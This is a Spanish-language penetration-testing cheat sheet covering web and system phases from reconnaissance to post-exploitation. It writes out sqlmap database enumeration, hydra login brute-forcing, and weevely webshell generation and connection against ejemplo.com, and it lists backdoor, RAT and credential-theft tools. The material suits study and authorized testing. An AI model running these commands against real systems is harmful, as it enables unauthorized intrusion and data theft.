# Pentesting en Aplicaciones Web
## Fase 1: Reconocimiento
### Recopilación de información pasiva
- Whois, theHarvester, Shodan para información del dominio y la infraestructura
- Amass y Subfinder para enumeración de subdominios
- Waybackurls para descubrir URLs antiguas

```
whois ejemplo.com
theHarvester -d ejemplo.com -b all
shodan search hostname:ejemplo.com

amass enum -d ejemplo.com 
subfinder -d ejemplo.com
waybackurls ejemplo.com
```

### Mapeo de la aplicación
- Wappalyzer para identificar tecnologías
- Nmap con scripts específicos para web
- Eyewitness para captura automatizada de screenshots

```
nmap -sV --script=http-* ejemplo.com
```
## Fase 2: Análisis y descubrimiento
### Enumeración de directorios y archivos
- Gobuster o Dirbuster para directorios
- Feroxbuster para enumeración recursiva
- ffuf para fuzzing avanzado de parámetros y endpoints

```
gobuster dir -u http://ejemplo.com -w /ruta/a/wordlist.txt
feroxbuster --url http://ejemplo.com -w /ruta/a/wordlist.txt
ffuf -w /ruta/a/wordlist.txt -u http://ejemplo.com/FUZZ # Fuzzing básico
ffuf -w /ruta/a/wordlist.txt -u http://ejemplo.com/?param=FUZZ # Fuzzing de parámetros
```
### Escáner de vulnerabilidades
- Nikto para escaneo general
- Nuclei con plantillas actualizadas
- Acunetix o Burp Suite Pro

```
nikto -h http://ejemplo.com
nuclei -u http://ejemplo.com -t nuclei-templates/
```
### Análisis de APIs
- Postman para pruebas manuales de APIs
- Arjun para descubrimiento de parámetros
- JWT_Tool para analizar tokens JWT
```
arjun -u http://ejemplo.com/api -m GET # Descubrimiento de parámetros GET
jwt_tool eyJ0eXAiOiJKV... [token] # Análisis básico de token JWT
```
## Fase 3: Explotación manual
### Interceptación y manipulación
- Burp Suite (Repeater, Intruder, Comparer):
	Proxy: Intercepta y modifica peticiones
	Repeater: Reenvía peticiones modificadas manualmente
	Intruder: Automatiza ataques de fuzzing
	Comparer: Compara respuestas para detectar diferencias
	Decoder: Codifica/decodifica datos
- OWASP ZAP con complementos adicionales
	Proxy manual: Intercepta peticiones
	Escaneo activo: Busca vulnerabilidades automáticamente
	Spider: Descubre URLs del sitio
	Fuzzer: Similar al Intruder de Burp
- Caido como alternativa más ligera

### Explotación específica
- SQLmap para inyecciones SQL automáticas
- XSStrike y Dalfox para Cross-Site Scripting
- NoSQLMap para bases de datos NoSQL
- Commix para inyección de comandos

```
sqlmap -u "http://ejemplo.com/page.php?id=1"  # Detección básica
sqlmap -u "http://ejemplo.com/page.php?id=1" --dbs  # Enumera bases de datos
sqlmap -u "http://ejemplo.com/page.php?id=1" -D nombre_db --tables  # Enumera tablas
xsstrike -u "http://ejemplo.com/page.php?id=1"  # Prueba de XSS
dalfox url http://ejemplo.com/page.php?id=1  # Prueba de XSS
commix --url="http://ejemplo.com/page.php?id=1"  # Prueba inyección de comandos
```
### Evaluación de autenticación y sesiones
- hydra para ataques de fuerza bruta
- CeWL para generar diccionarios personalizados
- Cookiebro o extensiones similares para manipulación de cookies

```
hydra -l admin -P wordlist.txt ejemplo.com http-post-form "/login:usuario=^USER^&password=^PASS^:Mensaje de error"
cewl http://ejemplo.com -d 2 -m 5 -w wordlist.txt  # Genera diccionario desde el contenido web
```

## Fase 4: Post-explotación web
### Escalada de privilegios
- SUDO_KILLER para problemas de permisos
- linPEAS/winPEAS si se consigue acceso al sistema
```
# Subir al servidor y ejecutar
./linpeas.sh  # Enumera posibles vectores de escalada de privilegios
```
### Persistencia y movimiento lateral
- Webshells como p0wny-shell, weevely
- Proxychains para pivoteo a redes internas

```
# Ejemplos de uso:
# Subir weevely a la máquina objetivo
weevely generate contraseña /ruta/shell.php  # Genera webshell
weevely http://ejemplo.com/ruta/shell.php contraseña  # Conecta a la shell

flameshot gui  # Inicia herramienta de captura interactiva

# Metasploit
use auxiliary/scanner/http/dir_scanner  # Escaneo de directorios
use auxiliary/scanner/http/brute_dirs  # Fuerza bruta de directorios
use auxiliary/scanner/http/http_login  # Fuerza bruta de login
```

# Caso 2: Pentesting de Máquinas y Sistemas

## Fase 1: Reconocimiento de infraestructura

### Escaneo de red
- Nmap con diversas técnicas de escaneo (-sS, -sV, -sC)
- Angry IP Scanner para redes locales
- Masscan para escaneos rápidos en redes grandes

### Enumeración de servicios
- enum4linux para sistemas Windows/Samba
- SNMPwal para dispositivos con SNMP habilitados
- Metasploit (módulos auxiliares de enumeración)

## Fase 2: Análisis de vulnerabilidades
### Escaneo automatizado
- OpenVAS como escáner integral
- Nessus para escaneos profundos
- Vulners (scripts de Nmap) para detección rápida

### Análisis específico por servicio
- SMBMap para recursos compartidos
- SSLyze o testssl.sh para configuraciones SSL/TLS
- CrackMapExec para entornos Windows

## Fase 3: Explotación del sistema
### Frameworks de explotación
- Metasploit Framework con sus módulos de exploit
- Empire para post-explotación PowerShell
- Covenant como C2 moderno

### Herramientas específicas
- Hashcat o John the Ripper para cracking de contraseñas
- Responder para ataques LLMNR/NBT-NS
- Mimikatz para extracción de credenciales

### Exploit personalizado
- SearchSploit para buscar exploits públicos
- Exploit-DB como referencia
- Immunity Debugger con mona.py como desarrollo de exploits

## Fase 4: Post-explotación y escalada
### Escalada de privilegios
- BeRoot para evaluación rápida
- PowerUp.ps1 para Windows
- Linux Smart Enumeration para Linux

### Persistencia y backdoors
- TheFatRat para generar backdoors
- Pupy RAT como RAT multiplataforma
- SharpC2 para entornos .NET

### Movimiento lateral
- Impacket (psexec.py y wmiexec.py)
- BloodHound para análisis de Active Directory
- Rubeus para ataques Kerberos
